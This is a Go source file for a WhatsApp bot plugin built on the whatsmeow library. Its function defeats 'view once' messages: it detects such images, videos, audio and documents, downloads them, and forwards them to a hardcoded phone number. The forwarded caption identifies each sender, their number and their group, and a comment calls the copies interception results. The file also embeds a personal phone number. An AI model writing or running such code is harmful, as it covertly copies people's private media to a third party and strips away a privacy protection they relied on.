package plugin

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"strings"

	"go.mau.fi/whatsmeow"
	"go.mau.fi/whatsmeow/binary/proto"
	"go.mau.fi/whatsmeow/types"
	"go.mau.fi/whatsmeow/types/events"
)

// AntiViewOncePasif mendeteksi pesan View Once dari struktur protobuf mentah
// dan meneruskan media ke nomor target dengan caption yang menjelaskan asal media.
func AntiViewOncePasif(client *whatsmeow.Client, m *events.Message) bool {
	ctx := context.Background()

	// Debug: print basic message info so we can tell when function is called
	fmt.Printf("[AntiViewOncePasif] triggered: msgID=%s chat=%s fromMe=%v isGroup=%v pushName=%s sender=%s\n",
		m.Info.ID, m.Info.Chat.String(), m.Info.IsFromMe, m.Info.IsGroup, m.Info.PushName, m.Info.Sender.User)

	// 1. Kunci nomor tujuan penerima hasil sadapan
	targetJID, errJID := types.ParseJID("6285161098098@s.whatsapp.net")
	if errJID != nil {
		fmt.Printf("[AntiViewOncePasif] parse target JID error: %v\n", errJID)
		return false
	}

	if m.Info.IsFromMe || m.Message == nil {
		fmt.Printf("[AntiViewOncePasif] skipped: fromMe=%v or Message==nil\n", m.Info.IsFromMe)
		return false
	}

	// Variabel untuk media
	var imgMsg *proto.ImageMessage
	var vidMsg *proto.VideoMessage
	var audMsg *proto.AudioMessage
	var docMsg *proto.DocumentMessage
	var isViewOnce bool

	// 1) Unwrap ALL possible wrapper layers (ViewOnce v1/v2, ephemeral, extensions)
	rawMessage := m.Message
	for rawMessage != nil {
		// Aggressively unwrap known wrapper types
		if rawMessage.GetViewOnceMessageV2() != nil {
			isViewOnce = true
			rawMessage = rawMessage.GetViewOnceMessageV2().GetMessage()
			continue
		}
		if rawMessage.GetViewOnceMessage() != nil {
			isViewOnce = true
			rawMessage = rawMessage.GetViewOnceMessage().GetMessage()
			continue
		}
		if rawMessage.GetViewOnceMessageV2Extension() != nil {
			isViewOnce = true
			rawMessage = rawMessage.GetViewOnceMessageV2Extension().GetMessage()
			continue
		}
		if rawMessage.GetEphemeralMessage() != nil {
			rawMessage = rawMessage.GetEphemeralMessage().GetMessage()
			continue
		}
		// Nothing left to unwrap
		break
	}

	if rawMessage == nil {
		fmt.Println("[AntiViewOncePasif] rawMessage nil after unwrapping")
		return false
	}

	// 2) Extract internal media objects and check their view-once flags
	if rawMessage.GetImageMessage() != nil {
		imgMsg = rawMessage.GetImageMessage()
		if imgMsg.GetViewOnce() {
			isViewOnce = true
		}
	}
	if rawMessage.GetVideoMessage() != nil {
		vidMsg = rawMessage.GetVideoMessage()
		if vidMsg.GetViewOnce() {
			isViewOnce = true
		}
	}
	if rawMessage.GetAudioMessage() != nil {
		audMsg = rawMessage.GetAudioMessage()
		if audMsg.GetViewOnce() {
			isViewOnce = true
		}
	}
	if rawMessage.GetDocumentMessage() != nil {
		docMsg = rawMessage.GetDocumentMessage()
		// Documents sometimes carry images/videos as documents (e.g., GIFs) and may be view-once
		// there's no explicit ViewOnce on DocumentMessage in some protobuf versions, so keep doc as possible
	}

	fmt.Printf("[AntiViewOncePasif] after unwrap: isViewOnce=%v img=%v vid=%v aud=%v doc=%v\n",
		isViewOnce, imgMsg != nil, vidMsg != nil, audMsg != nil, docMsg != nil)

	// If still not view-once or no media found, ignore
	if !isViewOnce || (imgMsg == nil && vidMsg == nil && audMsg == nil && docMsg == nil) {
		fmt.Println("[AntiViewOncePasif] not a view-once media or no media objects found")
		return false
	}

	// 3) Reaction: indicate processing started
	sendReactionRVO(client, m.Info.Chat, m.Info.ID, "🕒")

	// 4) Prepare source info for caption
	// m.Info.Sender is of type types.JID (non-pointer). Don't compare to nil.
	senderNumber := m.Info.Sender.User
	if strings.TrimSpace(senderNumber) == "" {
		senderNumber = "unknown"
	}
	senderName := m.Info.PushName
	if strings.TrimSpace(senderName) == "" {
		senderName = senderNumber
	}
	origin := "Private"
	groupName := "-"
	if m.Info.IsGroup {
		origin = "Grup"
		// Try to fetch group name (best-effort). GroupInfo has field Name, not GetName().
		if gi, err := client.GetGroupInfo(ctx, m.Info.Chat); err == nil && gi != nil {
			groupName = gi.Name
		} else {
			// fallback to chat id
			groupName = m.Info.Chat.String()
		}
	}

	baseCaptionPrefix := fmt.Sprintf("[RVO PASIF] Dari: %s\nNama: %s\nNomor: %s\nGrup: %s\n", origin, senderName, senderNumber, groupName)

	var data []byte
	var err error

	// helper to send failure reaction
	sendFail := func() {
		sendReactionRVO(client, m.Info.Chat, m.Info.ID, "❌")
	}

	// 5) Download & re-upload based on detected media type
	if imgMsg != nil {
		fmt.Printf("[AntiViewOncePasif] downloading image...\n")
		// Try to download image
		data, err = client.Download(ctx, imgMsg)
		if err != nil {
			fmt.Printf("[AntiViewOncePasif] download image error: %v\n", err)
			// fallback: forward original message if possible
			fmt.Printf("[AntiViewOncePasif] fallback: forwarding original message to %s\n", targetJID.String())
			forwardOriginalMessage(client, targetJID, m)
			sendFail()
			return true
		}
		uploaded, errUpload := client.Upload(ctx, data, whatsmeow.MediaImage)
		if errUpload != nil {
			fmt.Printf("[AntiViewOncePasif] upload image error: %v\n", errUpload)
			fmt.Printf("[AntiViewOncePasif] fallback: forwarding original message to %s\n", targetJID.String())
			forwardOriginalMessage(client, targetJID, m)
			sendFail()
			return true
		}
		captionStr := baseCaptionPrefix + "\n" + imgMsg.GetCaption()
		client.SendMessage(ctx, targetJID, &proto.Message{
			ImageMessage: &proto.ImageMessage{
				URL:           &uploaded.URL,
				DirectPath:    &uploaded.DirectPath,
				MediaKey:      uploaded.MediaKey,
				FileEncSHA256: uploaded.FileEncSHA256,
				FileSHA256:    uploaded.FileSHA256,
				FileLength:    &uploaded.FileLength,
				Mimetype:      imgMsg.Mimetype,
				Caption:       &captionStr,
			},
		})
		sendReactionRVO(client, m.Info.Chat, m.Info.ID, "✅")
	} else if vidMsg != nil {
		fmt.Printf("[AntiViewOncePasif] downloading video...\n")
		data, err = client.Download(ctx, vidMsg)
		if err != nil {
			fmt.Printf("[AntiViewOncePasif] download video error: %v\n", err)
			fmt.Printf("[AntiViewOncePasif] fallback: forwarding original message to %s\n", targetJID.String())
			forwardOriginalMessage(client, targetJID, m)
			sendFail()
			return true
		}
		uploaded, errUpload := client.Upload(ctx, data, whatsmeow.MediaVideo)
		if errUpload != nil {
			fmt.Printf("[AntiViewOncePasif] upload video error: %v\n", errUpload)
			fmt.Printf("[AntiViewOncePasif] fallback: forwarding original message to %s\n", targetJID.String())
			forwardOriginalMessage(client, targetJID, m)
			sendFail()
			return true
		}
		captionStr := baseCaptionPrefix + "\n" + vidMsg.GetCaption()
		client.SendMessage(ctx, targetJID, &proto.Message{
			VideoMessage: &proto.VideoMessage{
				URL:           &uploaded.URL,
				DirectPath:    &uploaded.DirectPath,
				MediaKey:      uploaded.MediaKey,
				FileEncSHA256: uploaded.FileEncSHA256,
				FileSHA256:    uploaded.FileSHA256,
				FileLength:    &uploaded.FileLength,
				Mimetype:      vidMsg.Mimetype,
				Caption:       &captionStr,
			},
		})
		sendReactionRVO(client, m.Info.Chat, m.Info.ID, "✅")
	} else if audMsg != nil {
		fmt.Printf("[AntiViewOncePasif] downloading audio...\n")
		data, err = client.Download(ctx, audMsg)
		if err != nil {
			fmt.Printf("[AntiViewOncePasif] download audio error: %v\n", err)
			fmt.Printf("[AntiViewOncePasif] fallback: forwarding original message to %s\n", targetJID.String())
			forwardOriginalMessage(client, targetJID, m)
			sendFail()
			return true
		}

		// convert to mp3 as before
		fileInput := fmt.Sprintf("temp_pasif_in_%s.ogg", m.Info.ID)
		fileOutput := fmt.Sprintf("temp_pasif_out_%s.mp3", m.Info.ID)

		err = os.WriteFile(fileInput, data, 0644)
		if err != nil {
			fmt.Printf("[AntiViewOncePasif] write audio temp error: %v\n", err)
			sendFail()
			return true
		}
		cmd := exec.Command("ffmpeg", "-y", "-i", fileInput, "-vn", "-ar", "44100", "-ac", "2", "-b:a", "128k", fileOutput)
		if errCmd := cmd.Run(); errCmd != nil {
			os.Remove(fileInput)
			fmt.Printf("[AntiViewOncePasif] ffmpeg error: %v\n", errCmd)
			fmt.Printf("[AntiViewOncePasif] fallback: forwarding original message to %s\n", targetJID.String())
			forwardOriginalMessage(client, targetJID, m)
			sendFail()
			return true
		}
		audioData, errRead := os.ReadFile(fileOutput)
		if errRead != nil {
			os.Remove(fileInput)
			os.Remove(fileOutput)
			fmt.Printf("[AntiViewOncePasif] read converted audio error: %v\n", errRead)
			sendFail()
			return true
		}
		uploaded, errUpload := client.Upload(ctx, audioData, whatsmeow.MediaAudio)
		if errUpload != nil {
			os.Remove(fileInput)
			os.Remove(fileOutput)
			fmt.Printf("[AntiViewOncePasif] upload audio error: %v\n", errUpload)
			fmt.Printf("[AntiViewOncePasif] fallback: forwarding original message to %s\n", targetJID.String())
			forwardOriginalMessage(client, targetJID, m)
			sendFail()
			return true
		}
		isPTT := true
		mpegMime := "audio/mpeg"
		client.SendMessage(ctx, targetJID, &proto.Message{
			AudioMessage: &proto.AudioMessage{
				URL:           &uploaded.URL,
				DirectPath:    &uploaded.DirectPath,
				MediaKey:      uploaded.MediaKey,
				FileEncSHA256: uploaded.FileEncSHA256,
				FileSHA256:    uploaded.FileSHA256,
				FileLength:    &uploaded.FileLength,
				Mimetype:      &mpegMime,
				PTT:           &isPTT,
			},
		})
		os.Remove(fileInput)
		os.Remove(fileOutput)
		sendReactionRVO(client, m.Info.Chat, m.Info.ID, "✅")
	} else if docMsg != nil {
		fmt.Printf("[AntiViewOncePasif] downloading document...\n")
		// Try to download document and re-send as DocumentMessage (keeps original filename/mimetype)
		data, err = client.Download(ctx, docMsg)
		if err != nil {
			fmt.Printf("[AntiViewOncePasif] download document error: %v\n", err)
			fmt.Printf("[AntiViewOncePasif] fallback: forwarding original message to %s\n", targetJID.String())
			forwardOriginalMessage(client, targetJID, m)
			sendFail()
			return true
		}
		uploaded, errUpload := client.Upload(ctx, data, whatsmeow.MediaDocument)
		if errUpload != nil {
			fmt.Printf("[AntiViewOncePasif] upload document error: %v\n", errUpload)
			fmt.Printf("[AntiViewOncePasif] fallback: forwarding original message to %s\n", targetJID.String())
			forwardOriginalMessage(client, targetJID, m)
			sendFail()
			return true
		}
		captionStr := baseCaptionPrefix + "\n" + docMsg.GetFileName()
		client.SendMessage(ctx, targetJID, &proto.Message{
			DocumentMessage: &proto.DocumentMessage{
				URL:           &uploaded.URL,
				DirectPath:    &uploaded.DirectPath,
				MediaKey:      uploaded.MediaKey,
				FileEncSHA256: uploaded.FileEncSHA256,
				FileSHA256:    uploaded.FileSHA256,
				FileLength:    &uploaded.FileLength,
				Mimetype:      docMsg.Mimetype,
				FileName:      docMsg.FileName,
				Caption:       &captionStr,
			},
		})
		sendReactionRVO(client, m.Info.Chat, m.Info.ID, "✅")
	}

	return true // dicegat, hentikan pemrosesan lebih lanjut di handler
}

func sendReactionRVO(client *whatsmeow.Client, chat types.JID, msgID string, emoji string) {
	ctx := context.Background()
	remoteJidStr := chat.String()
	fromMe := false

	client.SendMessage(ctx, chat, &proto.Message{
		ReactionMessage: &proto.ReactionMessage{
			Key: &proto.MessageKey{
				RemoteJID: &remoteJidStr,
				FromMe:    &fromMe,
				ID:        &msgID,
			},
			Text:              &emoji,
			SenderTimestampMS: new(int64),
		},
	})
}
